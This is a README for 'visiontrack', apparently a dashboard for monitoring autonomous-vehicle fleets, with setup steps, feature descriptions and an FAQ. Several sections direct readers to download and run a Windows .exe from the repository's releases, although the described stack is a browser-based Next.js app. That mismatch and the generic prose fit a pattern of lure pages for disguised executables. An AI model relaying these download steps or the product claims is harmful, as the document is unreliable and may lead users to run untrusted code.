# 👁️ visiontrack - Monitor autonomous vehicles in real time

<a href="https://github.com/Utilitybondhiphop551/visiontrack"><img src="https://img.shields.io/badge/Download-Application-blue.svg" alt="Download"></a>

## 📋 Project Overview

Visiontrack provides a way to view data from autonomous vehicles. It connects to vehicle systems to show information on a map. You can watch sensor data like cameras and LiDAR point clouds as vehicles move. This system helps fleet managers track locations and check vehicle health. It organizes data from different sources into one view. You see updates as they happen.

## 💻 System Requirements

To run this application, your computer needs enough power to process visual data. Ensure your machine meets these specifications:

- Operating System: Windows 10 or Windows 11.
- Processor: Intel Core i5 or better.
- Memory: 8 GB RAM minimum. 16 GB recommended.
- Storage: 500 MB of free disk space.
- Graphics: Dedicated graphics card with support for modern web browsers.
- Network: A stable internet connection for data streaming.

## ⬇️ Install the Software

1. Visit the repository page to download the software: https://github.com/Utilitybondhiphop551/visiontrack
2. Locate the latest release on the right side of the page.
3. Click the file ending in .exe to start the download.
4. Open the downloaded file once the process completes.
5. Follow the prompts on your screen to install the software.
6. Select a folder on your computer for the application files.
7. Click Finish to complete the setup.

## 🚀 Setting Up Your View

Once the installation finishes, double-click the visiontrack icon on your desktop. The program starts in your default web browser. 

The dashboard appears after the system initializes. You see a map view of the fleet. Each vehicle icon represents a unit currently sending data. Click an icon to open the detailed view. This panel displays information from the LiDAR sensors and onboard cameras. 

You can filter by vehicle status or location. The system updates these views every few seconds. If the map does not load, refresh your browser page to reload the connection.

## 🛠️ Managing Data Streams

Visiontrack uses MQTT to receive messages from vehicles. It also uses WebSockets to show that data on your screen. You do not need to configure these connections manually. The software handles the logic automatically. 

If you need to change the data source, navigate to the Settings menu. You can enter a different server address if your organization maintains a private fleet server. Always verify the address before you click save. 

## 📊 Viewing LiDAR and Camera Feeds

LiDAR point clouds show the shape of the environment around the vehicle. You can rotate this view with your mouse. Use your scroll wheel to zoom in on specific parts of the cloud. This helps you understand what the vehicle sees on the road.

Camera feeds appear in the sidebar. These show live images taken from the vehicle. You can click an image to enlarge it. The system overlays metadata on these images so you understand the vehicle speed and status.

## 💡 Troubleshooting Common Issues

If you encounter problems, check these items first:

- Check your internet connection. Data streaming requires a consistent flow of information.
- Restart the application. Closing and reopening the program fixes most connection errors.
- Clear your browser cache. Old files sometimes conflict with new data updates.
- Verify your firewall settings. Ensure the application has permission to reach the internet. 

The software log file stores details about errors. You can find this file in the installation folder. Send this file to your support team if problems persist.

## 📂 Understanding the Data Flow

The system architecture organizes data into several layers. First, the ingest layer takes MQTT packets from the road. The database layer stores logs for later review. PostgreSQL handles this data to ensure it stays organized. Prisma acts as the bridge between your interface and the database. Next.js powers the visual dashboard you see in your browser. This structure ensures your dashboard remains fast even when many vehicles send data at once.

## 🔑 Security and Privacy

Visiontrack protects data using encryption during transmission. This ensures that information from your vehicles remains private. The system includes access controls for administrators. You can create user accounts for your team members. Assign roles to limit which users can see specific vehicle data. Keep your login credentials in a secure place. Change your password often to maintain account health.

## 📝 Frequently Asked Questions

**Can I run multiple instances?**
You may run multiple windows if you need to monitor different regions of your fleet. 

**Does the software work offline?**
No. This application relies on real-time data from autonomous units. It requires an active internet connection to display the map and sensor feeds.

**How do I update the application?**
Check the repository link for new releases. Download the new version and run the installer again. The system updates your existing files automatically.

**Can I export data for reports?**
Yes. Use the Export button on the dashboard to save fleet logs to a file. You can choose PDF or CSV formats.

**Who owns the data?**
All data sent through your instance belongs to your organization. The software provides the tools to view and store it.

**Is there a limit to the number of vehicles?**
The software scales well, but your network speed determines how many feeds you can watch at once. Start with a small number of vehicles to determine your bandwidth needs.